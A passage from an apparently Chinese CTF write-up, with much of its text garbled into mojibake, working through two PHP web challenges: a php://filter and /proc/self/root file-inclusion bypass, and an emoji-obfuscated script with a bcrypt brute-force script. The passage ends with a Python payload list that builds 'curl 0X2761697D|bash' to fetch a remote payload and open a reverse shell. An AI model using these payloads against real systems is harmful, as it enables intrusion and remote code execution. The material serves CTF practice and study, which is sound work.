sometimes naive\"); &#125; die(\"Sorry, this site is only optimized for those who comes from localhost\"); &#125;show_source(__FILE__);include_once(\"flag.php\");if(isset($_POST['f'])) include_once($_POST['f']); è¿™é‡Œä¸»è¦é—®é¢˜æ˜¯reuqire_onceçš„é—®é¢˜ https://www.anquanke.com/post/id/213235#h3-2 è¿™é‡Œé¢çš„æºç è§£ææœ‰å¾—è¿˜æ˜¯çœ‹ä¸æ‡‚ï¼Œæ—¥åå†ç¿» é¦–å…ˆè¯´ä¸€ä¸‹phpæ–‡ä»¶åŒ…å«çš„æœºåˆ¶æ˜¯å°†å·²ç»åŒ…å«çš„æ–‡ä»¶ä¸æ–‡ä»¶çš„çœŸå®è·¯å¾„æ”¾è¿›å“ˆå¸Œè¡¨ä¸­ï¼Œå½“å·²ç»require_once(&#39;flag.php&#39;)ï¼Œå·²ç»includeçš„æ–‡ä»¶ä¸å¯ä»¥å†require_onceã€‚ payload 1php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php /proc/selfæŒ‡å‘å½“å‰è¿›ç¨‹çš„/proc/pid/ /proc/self/root/æŒ‡å‘/çš„ç¬¦å· ğŸ‘ğŸ™ŒğŸ˜ƒè€ƒç‚¹ä»£ç æ ¼å¼åŒ–ã€åæ··æ·†ï¼Œbcryptçˆ†ç ´ï¼Œå‘½ä»¤æ‰§è¡Œ è¿™ä¸ªé¢˜ æˆ‘åªèƒ½è¯´çœŸçš„ç‰›é€¼ çœŸçš„å¼€çœ¼ç•Œ è¿˜å¯ä»¥è¿™æ · 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960&lt;?phprequire 'vendor/autoload.php';use Bcrypt\\Bcrypt;highlight_file(__FILE__);ini_set(\"display_errors\",\"Off\");$ğŸ™=array('ğŸ™','ğŸ™‘','ğŸ™’','ğŸ™“','ğŸ™”','ğŸ™•','ğŸ™–','ğŸ™—','ğŸ™˜','ğŸ™™','ğŸ™š','ğŸ™›','ğŸ™œ','ğŸ™','ğŸ™','ğŸ™Ÿ');$ğŸ™ =array('ğŸ™ ','ğŸ™¡','ğŸ™¢','ğŸ™£','ğŸ™¤','ğŸ™¥','ğŸ™¦','ğŸ™§','ğŸ™¨','ğŸ™©','ğŸ™ª','ğŸ™«','ğŸ™¬','ğŸ™­','ğŸ™®','ğŸ™¯');$ğŸ™°=array('ğŸ™°','ğŸ™±','ğŸ™²','ğŸ™³','ğŸ™´','ğŸ™µ','ğŸ™¶','ğŸ™·','ğŸ™¸','ğŸ™¹','ğŸ™º','ğŸ™»','ğŸ™¼','ğŸ™½','ğŸ™¾','ğŸ™¿');$ğŸ˜€=array('ğŸ˜€','ğŸ˜','ğŸ˜‚','ğŸ˜ƒ','ğŸ˜„','ğŸ˜…','ğŸ˜†','ğŸ˜‡','ğŸ˜ˆ','ğŸ˜‰','ğŸ˜Š','ğŸ˜‹','ğŸ˜Œ','ğŸ˜','ğŸ˜','ğŸ˜');$ğŸ˜=array('ğŸ˜','ğŸ˜‘','ğŸ˜’','ğŸ˜“','ğŸ˜”','ğŸ˜•','ğŸ˜–','ğŸ˜—','ğŸ˜˜','ğŸ˜™','ğŸ˜š','ğŸ˜›','ğŸ˜œ','ğŸ˜','ğŸ˜','ğŸ˜Ÿ');$ğŸ˜ =array('ğŸ˜ ','ğŸ˜¡','ğŸ˜¢','ğŸ˜£','ğŸ˜¤','ğŸ˜¥','ğŸ˜¦','ğŸ˜§','ğŸ˜¨','ğŸ˜©','ğŸ˜ª','ğŸ˜«','ğŸ˜¬','ğŸ˜­','ğŸ˜®','ğŸ˜¯');$ğŸ˜°=array('ğŸ˜°','ğŸ˜±','ğŸ˜²','ğŸ˜³','ğŸ˜´','ğŸ˜µ','ğŸ˜¶','ğŸ˜·','ğŸ˜¸','ğŸ˜¹','ğŸ˜º','ğŸ˜»','ğŸ˜¼','ğŸ˜½','ğŸ˜¾','ğŸ˜¿');$ğŸ™€=array('ğŸ™€','ğŸ™','ğŸ™‚','ğŸ™ƒ','ğŸ™„','ğŸ™…','ğŸ™†','ğŸ™‡','ğŸ™ˆ','ğŸ™‰','ğŸ™Š','ğŸ™‹','ğŸ™Œ','ğŸ™','ğŸ™','ğŸ™');$ğŸ = array($ğŸ™ ,$ğŸ™ ,$ğŸ™°,$ğŸ˜€,$ğŸ˜,$ğŸ˜ ,$ğŸ˜°,$ğŸ™€);$ğŸ˜³ğŸ˜ƒğŸ˜¢ğŸ™‰ğŸ˜²ğŸ˜—ğŸ˜¦ğŸ™… = \"strlen\";$ğŸ˜©ğŸ˜‚ğŸ˜¸ğŸ™‰ = \"chr\";$ğŸ = \"base64_decode\";$ğŸ˜±ğŸ˜¨ğŸ˜ğŸ™ŠğŸ˜ªğŸ˜¨ğŸ˜¡ğŸ˜ = \"isset\";function ğŸ˜ªğŸ˜—ğŸ˜¦ğŸ˜ºğŸ˜²ğŸ˜‚ğŸ˜¢ğŸ˜¼($ğŸ˜³ğŸ˜ƒğŸ˜¢ğŸ™‰) &#123; global $ğŸ,$ğŸ˜³ğŸ˜ƒğŸ˜¢ğŸ™‰ğŸ˜²ğŸ˜—ğŸ˜¦ğŸ™…,$ğŸ˜©ğŸ˜‚ğŸ˜¸ğŸ™‰,$ğŸ,$ğŸ˜±ğŸ˜¨ğŸ˜ğŸ™ŠğŸ˜ªğŸ˜¨ğŸ˜¡ğŸ˜; $ğŸ˜²ğŸ˜—ğŸ˜¦ğŸ™…= (\"$ğŸ˜³ğŸ˜ƒğŸ˜¢ğŸ™‰ğŸ˜²ğŸ˜—ğŸ˜¦ğŸ™…\")($ğŸ˜³ğŸ˜ƒğŸ˜¢ğŸ™‰)/4; $ğŸ˜³ğŸ˜‚ğŸ˜šğŸ˜¼ = \"\"; for ($ğŸ˜±ğŸ˜§ğŸ˜¼ğŸ™€ = 0;$ğŸ˜±ğŸ˜§ğŸ˜¼ğŸ™€&lt;$ğŸ˜²ğŸ˜—ğŸ˜¦ğŸ™…;$ğŸ˜±ğŸ˜§ğŸ˜¼ğŸ™€++) &#123; $ğŸ˜©ğŸ˜‚ğŸ˜¦ğŸ™ƒ =$ğŸ˜³ğŸ˜ƒğŸ˜¢ğŸ™‰[$ğŸ˜±ğŸ˜§ğŸ˜¼ğŸ™€*4].$ğŸ˜³ğŸ˜ƒğŸ˜¢ğŸ™‰[$ğŸ˜±ğŸ˜§ğŸ˜¼ğŸ™€*4+1].$ğŸ˜³ğŸ˜ƒğŸ˜¢ğŸ™‰[$ğŸ˜±ğŸ˜§ğŸ˜¼ğŸ™€*4+2].$ğŸ˜³ğŸ˜ƒğŸ˜¢ğŸ™‰[$ğŸ˜±ğŸ˜§ğŸ˜¼ğŸ™€*4+3]; $ğŸ˜ªğŸ˜¾ğŸ˜ğŸ˜€ =0; $ğŸ˜³ğŸ˜‚ğŸ˜¦ğŸ˜º =0; for ($ğŸ˜±ğŸ˜½ğŸ™€ğŸ™ =0;$ğŸ˜±ğŸ˜½ğŸ™€ğŸ™&lt;8;$ğŸ˜±ğŸ˜½ğŸ™€ğŸ™++) &#123; for ($ğŸ˜±ğŸ˜‚ğŸ™„ğŸ™‚=0;$ğŸ˜±ğŸ˜‚ğŸ™„ğŸ™‚&lt;16;$ğŸ˜±ğŸ˜‚ğŸ™„ğŸ™‚++) &#123; if($ğŸ˜©ğŸ˜‚ğŸ˜¦ğŸ™ƒ == $ğŸ[$ğŸ˜±ğŸ˜½ğŸ™€ğŸ™][$ğŸ˜±ğŸ˜‚ğŸ™„ğŸ™‚]) &#123; $ğŸ˜ªğŸ˜¾ğŸ˜ğŸ˜€=$ğŸ˜±ğŸ˜½ğŸ™€ğŸ™; $ğŸ˜³ğŸ˜‚ğŸ˜¦ğŸ˜º = $ğŸ˜±ğŸ˜‚ğŸ™„ğŸ™‚; &#125; &#125; &#125; $ğŸ˜²ğŸ˜¾ğŸ˜¦ğŸ™„ = $ğŸ˜ªğŸ˜¾ğŸ˜ğŸ˜€*16+$ğŸ˜³ğŸ˜‚ğŸ˜¦ğŸ˜º; $ğŸ˜³ğŸ˜‚ğŸ˜šğŸ˜¼ = $ğŸ˜³ğŸ˜‚ğŸ˜šğŸ˜¼.(\"$ğŸ˜©ğŸ˜‚ğŸ˜¸ğŸ™‰\")($ğŸ˜²ğŸ˜¾ğŸ˜¦ğŸ™„); &#125; return (\"$ğŸ\")($ğŸ˜³ğŸ˜‚ğŸ˜šğŸ˜¼);&#125;function ğŸ˜ğŸ˜() &#123; global $ğŸ,$ğŸ˜³ğŸ˜ƒğŸ˜¢ğŸ™‰ğŸ˜²ğŸ˜—ğŸ˜¦ğŸ™…,$ğŸ˜©ğŸ˜‚ğŸ˜¸ğŸ™‰,$ğŸ,$ğŸ˜±ğŸ˜¨ğŸ˜ğŸ™ŠğŸ˜ªğŸ˜¨ğŸ˜¡ğŸ˜; $ğŸ˜³ğŸ˜‚ğŸ˜–ğŸ™…ğŸ˜ªğŸ˜—ğŸ˜š = ğŸ˜ªğŸ˜—ğŸ˜¦ğŸ˜ºğŸ˜²ğŸ˜‚ğŸ˜¢ğŸ˜¼(ğŸ˜œğŸ˜ƒğŸ˜ªğŸ˜¸ğŸ˜³ğŸ˜¹ğŸ˜‰ğŸ˜ƒğŸ˜´ğŸ˜ƒğŸ˜³ğŸ™†ğŸ˜±ğŸ˜˜ğŸ˜¢ğŸ™„ğŸ˜²ğŸ˜“ğŸ˜‰ğŸ™ŠğŸ˜©ğŸ˜§ğŸ˜…ğŸ˜»ğŸ˜©ğŸ˜½ğŸ˜‰ğŸ˜„ğŸ˜œğŸ™‡ğŸ˜ğŸ˜).ğŸ˜ªğŸ˜—ğŸ˜¦ğŸ˜ºğŸ˜²ğŸ˜‚ğŸ˜¢ğŸ˜¼(ğŸ˜²ğŸ˜§ğŸ˜¡ğŸ˜)($_SERVER[ğŸ˜ªğŸ˜—ğŸ˜¦ğŸ˜ºğŸ˜²ğŸ˜‚ğŸ˜¢ğŸ˜¼(ğŸ˜¥ğŸ˜»ğŸ˜¦ğŸ˜ğŸ˜¤ğŸ˜ğŸ˜¢ğŸ˜–ğŸ˜¨ğŸ˜€ğŸ˜–ğŸ˜•ğŸ˜¢ğŸ˜–ğŸ˜™ğŸ˜)]); ğŸ˜ªğŸ˜—ğŸ˜¦ğŸ˜ºğŸ˜²ğŸ˜‚ğŸ˜¢ğŸ˜¼(ğŸ˜²ğŸ˜§ğŸ™„ğŸ˜»ğŸ˜±ğŸ˜¨ğŸ˜™ğŸ˜)($ğŸ˜³ğŸ˜‚ğŸ˜–ğŸ™…ğŸ˜ªğŸ˜—ğŸ˜š); ğŸ˜ªğŸ˜—ğŸ˜¦ğŸ˜ºğŸ˜²ğŸ˜‚ğŸ˜¢ğŸ˜¼(ğŸ˜©ğŸ˜‚ğŸ˜¸ğŸ˜»ğŸ˜±ğŸ˜¨ğŸ˜™ğŸ˜)($ğŸ˜³ğŸ˜‚ğŸ˜–ğŸ™…ğŸ˜ªğŸ˜—ğŸ˜š); if (isset($_GET[ğŸ˜ªğŸ˜—ğŸ˜¦ğŸ˜ºğŸ˜²ğŸ˜‚ğŸ˜¢ğŸ˜¼(ğŸ˜©ğŸ˜‚ğŸ˜ğŸ˜»)]) &amp;&amp; ($ğŸ˜³ğŸ˜ƒğŸ˜¢ğŸ™‰ğŸ˜²ğŸ˜—ğŸ˜¦ğŸ™…)($_GET[ğŸ˜ªğŸ˜—ğŸ˜¦ğŸ˜ºğŸ˜²ğŸ˜‚ğŸ˜¢ğŸ˜¼(ğŸ˜©ğŸ˜‚ğŸ˜ğŸ˜»)]) &lt;= 5) &#123; @ğŸ˜ªğŸ˜—ğŸ˜¦ğŸ˜ºğŸ˜²ğŸ˜‚ğŸ˜¢ğŸ˜¼(ğŸ˜ªğŸ˜¨ğŸ˜¸ğŸ˜¼ğŸ˜©ğŸ™‡ğŸ˜ğŸ˜)($_GET[ğŸ˜ªğŸ˜—ğŸ˜¦ğŸ˜ºğŸ˜²ğŸ˜‚ğŸ˜¢ğŸ˜¼(ğŸ˜©ğŸ˜‚ğŸ˜ğŸ˜»)]); &#125; else if (isset($_GET[ğŸ˜ªğŸ˜—ğŸ˜¦ğŸ˜ºğŸ˜²ğŸ˜‚ğŸ˜¢ğŸ˜¼(ğŸ˜³ğŸ˜½ğŸ˜¦ğŸ™ŠğŸ˜ªğŸ˜¨ğŸ˜¡ğŸ˜)])) &#123; @ğŸ˜ªğŸ˜—ğŸ˜¦ğŸ˜ºğŸ˜²ğŸ˜‚ğŸ˜¢ğŸ˜¼(ğŸ˜ªğŸ˜¨ğŸ˜¸ğŸ˜¼ğŸ˜©ğŸ™‡ğŸ˜ğŸ˜)(ğŸ˜ªğŸ˜—ğŸ˜¦ğŸ˜ºğŸ˜²ğŸ˜‚ğŸ˜¢ğŸ˜¼(ğŸ˜³ğŸ˜½ğŸ˜€ğŸ˜·ğŸ˜œğŸ˜¨ğŸ˜šğŸ˜½ğŸ˜™ğŸ˜‘ğŸ˜ğŸ˜) . $ğŸ˜³ğŸ˜‚ğŸ˜–ğŸ™…ğŸ˜ªğŸ˜—ğŸ˜š); &#125;&#125;$ğŸ¯ = new Bcrypt();$ğŸ”‘ = $_POST[ğŸ˜ªğŸ˜—ğŸ˜¦ğŸ˜ºğŸ˜²ğŸ˜‚ğŸ˜¢ğŸ˜¼(ğŸ˜³ğŸ˜—ğŸ˜–ğŸ™ŠğŸ˜³ğŸ˜ƒğŸ˜´ğŸ˜»)];$ğŸ”’ = ğŸ˜ªğŸ˜—ğŸ˜¦ğŸ˜ºğŸ˜²ğŸ˜‚ğŸ˜¢ğŸ˜¼(ğŸ˜šğŸ˜”ğŸ˜šğŸ˜…ğŸ˜šğŸ˜”ğŸ˜•ğŸ™‡ğŸ˜šğŸ˜–ğŸ˜šğŸ˜“ğŸ˜ªğŸ˜½ğŸ˜»ğŸ˜„ğŸ˜¥ğŸ˜¨ğŸ˜’ğŸ˜›ğŸ˜£ğŸ˜¼ğŸ˜–ğŸ˜¢ğŸ˜²ğŸ˜¥ğŸ™€ğŸ˜•ğŸ˜ğŸ˜»ğŸ˜ªğŸ˜…ğŸ˜²ğŸ˜˜ğŸ˜¦ğŸ™‰ğŸ˜£ğŸ˜½ğŸ˜¦ğŸ™ˆğŸ˜²ğŸ˜¦ğŸ˜‘ğŸ™…ğŸ˜ğŸ˜½ğŸ˜ğŸ˜ğŸ˜²ğŸ˜ºğŸ˜´ğŸ˜€ğŸ˜ªğŸ˜—ğŸ˜‰ğŸ˜œğŸ˜©ğŸ˜ƒğŸ™€ğŸ˜ğŸ˜ğŸ˜¾ğŸ˜©ğŸ˜…ğŸ˜±ğŸ˜–ğŸ˜ğŸ˜ºğŸ˜ªğŸ˜”ğŸ˜¼ğŸ˜†ğŸ˜¢ğŸ˜—ğŸ˜¿ğŸ™ŠğŸ˜´ğŸ˜ğŸ˜¸ğŸ˜¼);if($ğŸ¯-&gt;verify($ğŸ”‘, $ğŸ”’)) &#123; echo(ğŸ˜ªğŸ˜—ğŸ˜¦ğŸ˜ºğŸ˜²ğŸ˜‚ğŸ˜¢ğŸ˜¼(ğŸ˜ ğŸ˜“ğŸ˜‰ğŸ˜¹ğŸ˜³ğŸ˜ºğŸ˜…ğŸ˜¡ğŸ˜©ğŸ˜¨ğŸ˜ğŸ™ŠğŸ˜´ğŸ˜‚ğŸ˜‰ğŸ™‰ğŸ˜ªğŸ˜“ğŸ˜’ğŸ˜‚ğŸ˜ªğŸ˜¨ğŸ˜šğŸ™€ğŸ˜ªğŸ˜½ğŸ˜¼ğŸ˜¼ğŸ˜ªğŸ˜“ğŸ˜•ğŸ˜ˆğŸ˜œğŸ˜‚ğŸ˜šğŸ™‰ğŸ˜ ğŸ˜·ğŸ˜ğŸ˜)); echo(ğŸ˜ªğŸ˜—ğŸ˜¦ğŸ˜ºğŸ˜²ğŸ˜‚ğŸ˜¢ğŸ˜¼(ğŸ˜¦ğŸ˜‚ğŸ˜‰ğŸ˜ƒğŸ˜™ğŸ˜£ğŸ˜–ğŸ˜ŸğŸ˜²ğŸ˜ƒğŸ˜³ğŸ™ƒğŸ˜±ğŸ˜—ğŸ˜–ğŸ˜ºğŸ˜±ğŸ™‰ğŸ˜’ğŸ™€ğŸ˜´ğŸ˜“ğŸ˜•ğŸ˜ˆğŸ˜œğŸ˜‚ğŸ˜šğŸ™‰ğŸ˜ ğŸ˜·ğŸ˜ğŸ˜)); ğŸ˜ğŸ˜();&#125; else &#123; echo(ğŸ˜ªğŸ˜—ğŸ˜¦ğŸ˜ºğŸ˜²ğŸ˜‚ğŸ˜¢ğŸ˜¼(ğŸ˜ ğŸ˜“ğŸ˜‰ğŸ˜¹ğŸ˜³ğŸ˜ºğŸ˜…ğŸ˜¡ğŸ˜©ğŸ˜¨ğŸ˜ğŸ™ŠğŸ˜´ğŸ˜‚ğŸ˜‰ğŸ™‰ğŸ˜ªğŸ˜“ğŸ˜’ğŸ™…ğŸ˜²ğŸ˜ƒğŸ˜¡ğŸ˜·ğŸ˜²ğŸ˜§ğŸ˜–ğŸ˜€ğŸ˜©ğŸ˜‚ğŸ˜·ğŸ˜¸ğŸ˜ ğŸ˜“ğŸ˜‰ğŸ˜¹ğŸ˜³ğŸ˜ºğŸ˜„ğŸ˜));&#125; é¦–å…ˆæ˜¯ä»£ç æ ¼å¼åŒ–ï¼Œæ¥ç€å°±æ˜¯ç†è§£ä»£ç çš„æ‰§è¡Œé€»è¾‘ï¼Œé¡ºä¾¿æ”¹å˜ä»£ç é€»è¾‘ çœ‹é¢˜è§£ä¸Šçœ‹çš„æ˜¯ç¬¬ä¸€ä¸ªå‡½æ•°ï¼Œä¹Ÿå°±æ˜¯æ··æ·† ä¸ºä»€ä¹ˆè¦å…ˆçœ‹ç¬¬ä¸€ä¸ªå‡½æ•° æ‰€ä»¥æˆ‘ä»¬å°±æƒ³ç›´æ¥çœ‹åœ¨ä¸åŒå‚æ•°ä¸‹ç¬¬ä¸€ä¸ªå‡½æ•°æ‰§è¡Œè¾“å‡ºçš„ç»“æœï¼Œæ‰€ä»¥åœ¨ç¬¬ä¸€ä¸ªå‡½æ•°ä¸­æ·»åŠ  1234567891011121314151617181920212223function ğŸ˜ªğŸ˜—ğŸ˜¦ğŸ˜ºğŸ˜²ğŸ˜‚ğŸ˜¢ğŸ˜¼($ğŸ˜³ğŸ˜ƒğŸ˜¢ğŸ™‰) &#123; echo \"åŠ å¯†åï¼š\".$ğŸ˜³ğŸ˜ƒğŸ˜¢ğŸ™‰; global $ğŸ,$ğŸ˜³ğŸ˜ƒğŸ˜¢ğŸ™‰ğŸ˜²ğŸ˜—ğŸ˜¦ğŸ™…,$ğŸ˜©ğŸ˜‚ğŸ˜¸ğŸ™‰,$ğŸ,$ğŸ˜±ğŸ˜¨ğŸ˜ğŸ™ŠğŸ˜ªğŸ˜¨ğŸ˜¡ğŸ˜; $ğŸ˜²ğŸ˜—ğŸ˜¦ğŸ™…= (\"$ğŸ˜³ğŸ˜ƒğŸ˜¢ğŸ™‰ğŸ˜²ğŸ˜—ğŸ˜¦ğŸ™…\")($ğŸ˜³ğŸ˜ƒğŸ˜¢ğŸ™‰)/4; $ğŸ˜³ğŸ˜‚ğŸ˜šğŸ˜¼ = \"\"; for ($ğŸ˜±ğŸ˜§ğŸ˜¼ğŸ™€ = 0;$ğŸ˜±ğŸ˜§ğŸ˜¼ğŸ™€&lt;$ğŸ˜²ğŸ˜—ğŸ˜¦ğŸ™…;$ğŸ˜±ğŸ˜§ğŸ˜¼ğŸ™€++) &#123; $ğŸ˜©ğŸ˜‚ğŸ˜¦ğŸ™ƒ =$ğŸ˜³ğŸ˜ƒğŸ˜¢ğŸ™‰[$ğŸ˜±ğŸ˜§ğŸ˜¼ğŸ™€*4].$ğŸ˜³ğŸ˜ƒğŸ˜¢ğŸ™‰[$ğŸ˜±ğŸ˜§ğŸ˜¼ğŸ™€*4+1].$ğŸ˜³ğŸ˜ƒğŸ˜¢ğŸ™‰[$ğŸ˜±ğŸ˜§ğŸ˜¼ğŸ™€*4+2].$ğŸ˜³ğŸ˜ƒğŸ˜¢ğŸ™‰[$ğŸ˜±ğŸ˜§ğŸ˜¼ğŸ™€*4+3]; $ğŸ˜ªğŸ˜¾ğŸ˜ğŸ˜€ =0; $ğŸ˜³ğŸ˜‚ğŸ˜¦ğŸ˜º =0; for ($ğŸ˜±ğŸ˜½ğŸ™€ğŸ™ =0;$ğŸ˜±ğŸ˜½ğŸ™€ğŸ™&lt;8;$ğŸ˜±ğŸ˜½ğŸ™€ğŸ™++) &#123; for ($ğŸ˜±ğŸ˜‚ğŸ™„ğŸ™‚=0;$ğŸ˜±ğŸ˜‚ğŸ™„ğŸ™‚&lt;16;$ğŸ˜±ğŸ˜‚ğŸ™„ğŸ™‚++) &#123; if($ğŸ˜©ğŸ˜‚ğŸ˜¦ğŸ™ƒ == $ğŸ[$ğŸ˜±ğŸ˜½ğŸ™€ğŸ™][$ğŸ˜±ğŸ˜‚ğŸ™„ğŸ™‚]) &#123; $ğŸ˜ªğŸ˜¾ğŸ˜ğŸ˜€=$ğŸ˜±ğŸ˜½ğŸ™€ğŸ™; $ğŸ˜³ğŸ˜‚ğŸ˜¦ğŸ˜º = $ğŸ˜±ğŸ˜‚ğŸ™„ğŸ™‚; &#125; &#125; &#125; $ğŸ˜²ğŸ˜¾ğŸ˜¦ğŸ™„ = $ğŸ˜ªğŸ˜¾ğŸ˜ğŸ˜€*16+$ğŸ˜³ğŸ˜‚ğŸ˜¦ğŸ˜º; $ğŸ˜³ğŸ˜‚ğŸ˜šğŸ˜¼ = $ğŸ˜³ğŸ˜‚ğŸ˜šğŸ˜¼.(\"$ğŸ˜©ğŸ˜‚ğŸ˜¸ğŸ™‰\")($ğŸ˜²ğŸ˜¾ğŸ˜¦ğŸ™„); &#125; echo \"åŸæ–‡ï¼š\".(\"$ğŸ\")($ğŸ˜³ğŸ˜‚ğŸ˜šğŸ˜¼); return (\"$ğŸ\")($ğŸ˜³ğŸ˜‚ğŸ˜šğŸ˜¼);&#125; ä¹‹åä¾æ¬¡ä¿®æ”¹ä»£ç é€»è¾‘ï¼Œæ›¿æ¢å…¶ä¸­ç¬¬ä¸€ä¸ªå‡½æ•°è¾“å‡ºç»“æœ æ ¸å¿ƒä»£ç  1234567891011121314151617181920212223function ğŸ˜ğŸ˜() &#123; global $ğŸ,$strlen,$chr,$base64_decode,$isset; $path = \"/var/www/html/sandbox/\".md5($_SERVER['REMOTE_ADDR']); mkdir($path); chdir($path); if (isset($_GET['cmd']) &amp;&amp; strlen($_GET['cmd']) &lt;= 5) &#123; @exec($_GET['cmd']); // &#125; else if (isset($_GET['reset'])) &#123; @exec(\"rm -rf\" . $path); &#125;&#125;$ğŸ¯ = new Bcrypt();$ğŸ”‘ = $_POST[\"passwd\"];$ğŸ”’ = \"$2y$10$RBfi8QpJJQQmJD6FylurJeqmP.6cMn7tdoKczL2v9hScd9zDj3wXe\";if($ğŸ¯-&gt;verify($passwd, $lock)) &#123; echo \"Password verified!\"; echo \"Wow!!Now,hack it!\"; ğŸ˜ğŸ˜();&#125; else &#123; echo \"&lt;/br&gt;Password not match!&lt;/br&gt;\";&#125; ç„¶åå‘ç°æœ‰composeråŒ…ï¼Œå®‰è£…ï¼Œç„¶åæŸ¥èµ„æ–™bcrypt bcryptbcryptæ˜¯ä¸€ç§å“ˆå¸Œç®—æ³•ï¼Œå¯ä»¥é€šè¿‡ç¡¬ä»¶è¿›è¡Œæ‰©å±•ï¼ˆé€šè¿‡å¯é…ç½®çš„å¾ªç¯æ¬¡æ•°ï¼‰ã€‚ bcryptæ˜¯ä¸€ç§å•å‘å“ˆå¸Œç®—æ³•ã€‚å¦‚æœä¸çŸ¥é“ç›ï¼Œåœ†å’Œå¯†ç ï¼ˆå¯†ç ï¼‰ï¼Œåˆ™æ— æ³•æ£€ç´¢çº¯æ–‡æœ¬å¯†ç ã€‚ åŠ ç›ï¼š å°±æ˜¯äººä¸ºçš„é€šè¿‡ä¸€ç»„éšæœºå­—ç¬¦ä¸ç”¨æˆ·åŸå¯†ç çš„ç»„åˆå½¢æˆä¸€ä¸ªæ–°çš„å­—ç¬¦ï¼Œä»è€Œå¢åŠ ç ´è¯‘çš„éš¾åº¦ã€‚ åœ¨phpä¸­ï¼Œä¸»è¦æœ‰å†…ç½®çš„å‡½æ•°password_hashå’Œpassword_verify 12345678910111213141516171819$a = password_hash('password',PASSWORD_DEFAULT);echo $a.\"&lt;br&gt;\";if(password_verify('password',$a))&#123; echo \"success\";&#125;else&#123; echo \"failed\";&#125;var_dump(password_get_info($a));#è¾“å‡ºä¿¡æ¯array (size=3) 'algo' =&gt; int 1 'algoName' =&gt; string 'bcrypt' (length=6) 'options' =&gt; array (size=1) 'cost' =&gt; int 10$a = password_hash('password',PASSWORD_DEFAULT,array('cost' =&gt; 11));//ç›¸åº”çš„costä¹Ÿä¼šå˜ä¸º11ï¼› æ¥ä¸‹æ¥å°±æ˜¯çˆ†ç ´ï¼Œå·²çŸ¥å¯†ç ä¸ºbcrypt+4ä½å°å†™å­—æ¯ 1234567891011121314151617181920&lt;?php require 'vendor/autoload.php'; use Bcrypt\\Bcrypt; $key = \"abcdefghijklmnopqrstuvwxyz\"; $bcrypt = new Bcrypt(); $plaintext = 'bcrypt';//bcryptyyds $ciphertext = '$2y$10$RBfi8QpJJQQmJD6FylurJeqmP.6cMn7tdoKczL2v9hScd9zDj3wXe'; for($i=0;$i&lt;26;$i++) &#123; for($j=0;$j&lt;26;$j++) &#123; for($k=0;$k&lt;26;$k++) &#123; for($m=0;$m&lt;26;$m++) &#123; echo $plaintext.$str.PHP_EOL; $str = $key[$i].$key[$j].$key[$k].$key[$m]; if($bcrypt-&gt;verify($plaintext.$str, $ciphertext))&#123; echo(\"&lt;/br&gt;Password verified!&lt;/br&gt;\"); echo(\"Wow!!Now,hack it!&lt;/br&gt;\"); &#125; &#125; &#125; &#125; &#125; å‘½ä»¤æ‰§è¡Œæœ€ç»ˆçš„è€ƒç‚¹å°±æ˜¯å‘½ä»¤æ‰§è¡Œå¯ä»¥å‚è€ƒhitcon-ctf-2017 123456789101112function ğŸ˜ğŸ˜() &#123; global $ğŸ,$strlen,$chr,$base64_decode,$isset; $path = \"/var/www/html/sandbox/\".md5($_SERVER['REMOTE_ADDR']); mkdir($path); chdir($path); if (isset($_GET['cmd']) &amp;&amp; strlen($_GET['cmd']) &lt;= 5) &#123; @exec($_GET['cmd']); // &#125; else if (isset($_GET['reset'])) &#123; @exec(\"rm -rf\" . $path); &#125;&#125; è¿™é“é¢˜å¤§æ¦‚æ„æ€å°±æ˜¯å­˜åœ¨å‘½ä»¤æ‰§è¡Œï¼Œä½†å•æ¬¡è¾“å…¥å­—ç¬¦ä¸å¾—å¤§äº5ã€‚å› æ­¤åˆ©ç”¨linuxä¸‹ç‰¹æœ‰çš„å‘½ä»¤æ¥å†™å…¥shellåå¼¹ã€‚åŸç†å°±æ˜¯åˆ©ç”¨curl ip|bashç­‰å¾ˆå¤šæ–¹å¼å»åå¼¹shellã€‚é¡ºä¾¿ä¹Ÿå¤ä¹ äº†åå¼¹shellçš„ä¸€äº›åŸºæœ¬æ“ä½œ å®˜æ–¹çš„è„šæœ¬ 12345678910111213141516171819202122232425262728293031323334353637383940import requestsimport urllibfrom time import sleepurl = \"http://219.219.61.234:10048/?cmd=\"payload = [ # generate \"g&gt; ht- sl\" to file \"v\" '&gt;dir', '&gt;sl', '&gt;g\\&gt;', '&gt;ht-', '*&gt;v', # reverse file \"v\" to file \"x\", content \"ls -th &gt;g\" ' '&gt;rev', '*v&gt;x', # generate \"curl 0X2761697D|bash\" '&gt;sh ', '&gt;ba\\\\', '&gt;\\|\\\\', '&gt;\\\\', '&gt;7D\\\\', '&gt;69\\\\', '&gt;61\\\\', '&gt;27\\\\', '&gt;0X\\\\', '&gt;\\ \\\\', '&gt;rl\\\\', '&gt;cu\\\\', # got shell 'sh x', 'sh g',]for i in payload: assert len(i) &lt;= 5 data = &#123; 'passwd':'bcryptyyds', &#125; header = &#123; \"Content-Type\" : \"application/x-www-form-urlencoded\", \"Accept\" : \"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,ima ge/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\", \"Upgrade-Insecure-Requests\" : \"1\" &#125; r = requests.post(url + urllib.quote(i),data=data,headers=header) print(i) sleep(0.1) è¿™ä¸ªå¾ˆéƒé—·ï¼Œé…ç½®ç¯å¢ƒå¾ˆé•¿æ—¶é—´è¿˜æ˜¯æ²¡èƒ½å¼„å‡ºæ¥ 